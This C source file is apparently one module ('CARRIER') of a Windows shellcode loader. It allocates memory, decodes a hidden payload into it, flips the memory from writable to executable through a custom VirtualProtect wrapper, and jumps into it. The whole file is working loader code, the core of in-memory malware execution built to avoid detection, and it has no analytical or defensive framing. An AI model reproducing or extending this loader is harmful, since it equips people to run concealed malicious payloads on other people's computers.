/* MODULE: CARRIER
 * TYPE: alloc_rw_rx
 * DESC: Allocates new memory (RW), Decodes, Protects (RX), Executes.
 */
#include "../header/definitions.h"
#include <stdio.h>

int carrier() {
    DWORD result;
    
    // 1. Allocate
    char *dest = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
    if (!dest) return 1;

    // 2. Decode
    decode_payload(dest, PAYLOAD_LEN);

    // 3. Protect (RW -> RX)
    if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result)) {
        return 2;
    }

    // 4. Execute
    (*(void(*)())(dest))();
    
    return 0;
}
